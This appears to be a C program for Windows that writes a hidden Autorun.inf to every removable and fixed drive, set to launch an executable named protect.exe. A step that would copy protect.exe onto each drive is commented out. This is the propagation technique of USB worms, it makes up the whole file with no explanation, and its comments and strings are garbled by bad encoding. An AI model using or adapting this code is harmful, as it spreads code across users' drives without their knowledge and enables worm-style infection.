#include <stdio.h>
#include <windows.h>
#include <stdlib.h>

int main (void)
{
  char Disk = '\0';
  UINT Type = 0;
  FILE *fp;
  char strFileName [MAX_PATH] = {0};
  char szDriveName[4] = {0};
  wsprintf(szDriveName, "C:\0");

  for(szDriveName[0]='C'; szDriveName[0] < 'Z'; szDriveName[0]++)
  {
      Type = GetDriveType(szDriveName);
      if( (Type == DRIVE_REMOVABLE) || (Type == DRIVE_FIXED) )
      {
        Disk = szDriveName[0];
        sprintf(strFileName, "%c:\\Autorun.inf", Disk);
        fp = fopen(strFileName, "w+");
        fprintf(fp, "[AutoRun]\n");
        fprintf(fp, "OPEN=c:\\Users\\���^\\Desktop\\protect.exe\n");
        fprintf(fp, "SHELLEXECUTE=c:\\Users\\���^\\Desktop\\protect.exe\n");
        fprintf(fp, "shell\\Auto\\command=protect.exe\n");
        fprintf(fp, "shell=Auto");
        fclose(fp);

        //�p�G�n�]�m���ê���
        SetFileAttributes(strFileName,FILE_ATTRIBUTE_HIDDEN);
        
        //start to copy... 
        sprintf(strFileName,"%c:\\protect.exe",Disk);
        //CopyFile("protect.exe", strFileName, TRUE);
        
        //�p�G�n�]�m���ê���
        //SetFileAttributes(strFileName,FILE_ATTRIBUTE_HIDDEN);
      } 
  }

  
 
  MessageBox(0, "�w�O�@�˸m", "�O�@����", 1);

  return 0;
}

